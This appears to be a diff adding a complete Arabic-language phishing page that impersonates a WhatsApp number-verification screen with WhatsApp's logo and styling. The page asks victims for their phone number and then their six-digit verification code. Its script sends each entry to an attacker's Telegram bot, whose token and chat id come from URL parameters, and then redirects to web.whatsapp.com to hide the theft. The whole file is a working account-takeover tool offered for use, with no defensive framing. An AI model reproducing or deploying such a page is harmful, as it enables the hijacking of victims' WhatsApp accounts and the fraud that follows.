@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>WhatsApp – توثيق الرقم</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:#075e54;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;border-radius:12px;padding:28px;width:360px;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,0.15)}img{width:80px;margin-bottom:12px}h2{color:#075e54;margin-bottom:8px;font-size:20px}p{color:#667781;font-size:14px;margin-bottom:16px}input{width:100%;padding:14px;margin:6px 0;border:1px solid #ddd;border-radius:8px;font-size:16px}.btn{width:100%;background:#25d366;color:#fff;border:none;padding:14px;border-radius:8px;font-weight:bold;font-size:16px;cursor:pointer;margin-top:8px}</style></head>
+<body><div class="card">
+<img src="https://static.whatsapp.net/rsrc.php/v3/yP/r/rYZqPCBaG70.png" alt="WhatsApp">
+<h2>توثيق رقم الواتساب</h2>
+<p>أدخل رقم هاتفك لاستلام كود التحقق</p>
+<input type="tel" id="phone" placeholder="رقم الهاتف الدولي (مثلاً +963...)" dir="ltr">
+<button class="btn" onclick="sendPhone()">إرسال كود التحقق</button>
+<div id="codeArea" style="display:none;margin-top:12px">
+<p style="color:#075e54">تم إرسال كود التحقق إلى رقمك</p>
+<input type="text" id="code" placeholder="أدخل كود التحقق المكون من 6 أرقام" dir="ltr" maxlength="6" inputmode="numeric" pattern="[0-9]*">
+<button class="btn" onclick="sendCode()">تأكيد الكود</button>
+</div>
+</div>
+<script>
+const p=new URLSearchParams(location.search),T=p.get('token'),C=p.get('chat');
+function sendPhone(){const ph=document.getElementById('phone').value;
+if(!ph)return alert('أدخل رقم الهاتف');
+document.getElementById('codeArea').style.display='block';
+fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent('💬 واتساب – رقم الهاتف\n📱 '+ph)}`)}
+function sendCode(){const co=document.getElementById('code').value,ph=document.getElementById('phone').value;
+if(!co)return alert('أدخل كود التحقق');
+fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent('💬 واتساب – كود التحقق\n📱 '+ph+'\n🔢 الكود: '+co)}`).finally(()=>{location.href='https://web.whatsapp.com'})}
+</script></body></html>
